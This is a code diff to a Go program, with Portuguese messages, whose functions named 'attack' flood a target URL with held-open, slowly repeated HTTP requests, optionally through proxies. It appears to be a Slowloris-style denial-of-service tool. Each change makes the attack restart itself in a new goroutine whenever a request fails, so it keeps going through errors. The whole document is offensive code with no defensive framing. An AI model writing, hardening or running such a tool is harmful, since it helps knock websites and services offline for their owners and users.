@@ -102,6 +102,7 @@ func attack(ctx context.Context, proxyURL string, dialTimeout, tlsTimeout, clien
             req, err := http.NewRequest("GET", targetURL, nil)
             if err != nil {
                 fmt.Println("Erro ao criar a requisição:", err)
+                go attack(ctx, proxyURL, dialTimeout, tlsTimeout, clientTimeout, stopChan)
                 return
             }
 
@@ -113,6 +114,7 @@ func attack(ctx context.Context, proxyURL string, dialTimeout, tlsTimeout, clien
             resp, err := client.Do(req)
             if err != nil {
                 fmt.Println("Erro ao enviar a requisição:", err)
+                go attack(ctx, proxyURL, dialTimeout, tlsTimeout, clientTimeout, stopChan)
                 return
             }
             defer resp.Body.Close()
@@ -131,6 +133,7 @@ func attack(ctx context.Context, proxyURL string, dialTimeout, tlsTimeout, clien
                         _, err := client.Do(req)
                         if err != nil {
                             fmt.Println("Erro ao manter a conexão:", err)
+                            go attack(ctx, proxyURL, dialTimeout, tlsTimeout, clientTimeout, stopChan)
                             return
                         }
                         time.Sleep(time.Millisecond * 100) // Pausa entre requisições para simular tráfego lento
@@ -150,6 +153,7 @@ func attack_sem_proxy(ctx  context.Context, clientTimeout time.Duration, stopCha
             req, err := http.NewRequest("GET", targetURL, nil)
             if err != nil {
                 fmt.Println("Erro ao criar a requisição:", err)
+                go attack_sem_proxy(ctx, clientTimeout, stopChan)
                 return
             }
 
@@ -161,6 +165,7 @@ func attack_sem_proxy(ctx  context.Context, clientTimeout time.Duration, stopCha
             resp, err := client.Do(req)
             if err != nil {
                 fmt.Println("Erro ao enviar a requisição:", err)
+                go attack_sem_proxy(ctx, clientTimeout, stopChan)
                 return
             }
             defer resp.Body.Close()
@@ -179,6 +184,7 @@ func attack_sem_proxy(ctx  context.Context, clientTimeout time.Duration, stopCha
                         _, err := client.Do(req)
                         if err != nil {
                             fmt.Println("Erro ao manter a conexão:", err)
+                            go attack_sem_proxy(ctx, clientTimeout, stopChan)
                             return
                         }
                         time.Sleep(time.Millisecond * 100) // Pausa entre requisições para simular tráfego lento
